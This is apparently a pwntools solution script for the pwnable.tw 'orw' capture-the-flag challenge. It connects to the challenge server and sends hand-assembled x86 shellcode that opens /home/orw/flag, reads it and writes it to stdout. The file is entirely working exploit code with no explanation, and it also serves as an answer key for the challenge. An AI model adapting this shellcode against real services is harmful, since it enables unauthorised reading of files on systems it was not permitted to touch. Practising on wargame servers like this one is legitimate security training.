from pwn import *
context.log_level="debug"

r = remote("chall.pwnable.tw", 10001)

sh = """
    call here
    .ascii "/home/orw/flag"
    .byte 0
here:
    pop ebx
    xor ecx, ecx
    xor edx, edx
    mov eax, 0x05
    int 0x80

    mov ebx, 0x03
    mov ecx, esp
    mov edx, 0x50
    mov eax, 0x03
    int 0x80

    mov ebx, 0x01
    mov ecx, esp
    mov edx, 0x50
    mov eax, 0x04
    int 0x80
"""

sh = asm(sh)
r.recv()
r.send(sh)

r.interactive()
